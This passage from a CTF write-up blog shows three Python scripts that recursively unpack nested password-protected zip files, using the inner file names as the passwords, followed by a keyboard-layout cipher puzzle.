+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">zippath = <span class="string">r&#x27;yasuobao.zip&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        temp = zipfile.ZipFile(zippath)</span><br><span class="line">        res = re.search(<span class="string">&#x27;[0-9]*&#x27;</span>, temp.namelist()[<span class="number">0</span>])</span><br><span class="line">        passwd = res.group()</span><br><span class="line">        temp.extractall(<span class="string">r&#x27;C:/Users/cys/Desktop/yasuobao/&#x27;</span>, pwd=passwd.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        temp.close()</span><br><span class="line">        os.remove(zippath)</span><br><span class="line">        zippath = <span class="string">r&#x27;C:/Users/cys/Desktop/yasuobao/&#x27;</span> + temp.namelist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>L佬的脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import zipfile </span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">now &#x3D; &quot;yasuobao.zip&quot;</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">	print(&quot;START &quot;+now)</span><br><span class="line">	zfile &#x3D; zipfile.ZipFile(now)</span><br><span class="line">	password &#x3D; zfile.namelist()[0].split(&#39;.&#39;)[0]</span><br><span class="line">	try:</span><br><span class="line">		zfile.extractall(members&#x3D;zfile.namelist(), pwd&#x3D;password.encode(&#39;utf-8&#39;))</span><br><span class="line">		zfile.close()</span><br><span class="line">		try:</span><br><span class="line">			os.remove(now)</span><br><span class="line">		except OSError as e:</span><br><span class="line">			print(e)</span><br><span class="line">		names &#x3D; os.listdir()</span><br><span class="line">		print(names)</span><br><span class="line">		for name in names:</span><br><span class="line">			if name.endswith(&#39;.zip&#39;) and name !&#x3D; now:</span><br><span class="line">				now&#x3D;name</span><br><span class="line">				break</span><br><span class="line">	except:</span><br><span class="line">		break</span><br><span class="line">	print(&#39;END &#39;+now)</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line">* 复制并使用代码请注明引用出处哦~</span><br><span class="line">* Lazzaro @ https:&#x2F;&#x2F;lazzzaro.github.io</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>Mumuzi</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line">zipname &#x3D; &quot;C:\\Users\\mumuzi\\Desktop\\yasuobao\\&quot;+&quot;23898.zip&quot;</span><br><span class="line">while True:</span><br><span class="line">    if zipname !&#x3D; &quot;C:\\Users\\mumuzi\\Desktop\\yasuobao\\999999.zip&quot;:</span><br><span class="line">        ts1 &#x3D; zipfile.ZipFile(zipname)</span><br><span class="line">        #print ts1.namelist()[0]</span><br><span class="line">        res &#x3D; re.search(&#39;[0-9]*&#39;,ts1.namelist()[0])</span><br><span class="line">        print(res.group())</span><br><span class="line">        passwd &#x3D; res.group()</span><br><span class="line">        ts1.extractall(&quot;C:\\Users\\mumuzi\\Desktop\\yasuobao&quot;,pwd&#x3D;passwd.encode(&#39;ascii&#39;))</span><br><span class="line">        zipname &#x3D; &quot;C:\\Users\\mumuzi\\Desktop\\yasuobao\\&quot;+ts1.namelist()[0]</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;find&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h1><p>UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/e988150dd04440239a033ee0d286e729.png"><br>字母不对就对照着笔记本看看</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/%E6%9F%90BC%E7%AB%99%E7%82%B9%E7%9A%84%E6%B8%97%E9%80%8F/" rel="prev" title="某BC站点的渗透">
+                  <i class="fa fa-angle-left"></i> 某BC站点的渗透
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/" rel="next" title="攻防世界 pwn 新手">
+                  攻防世界 pwn 新手 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
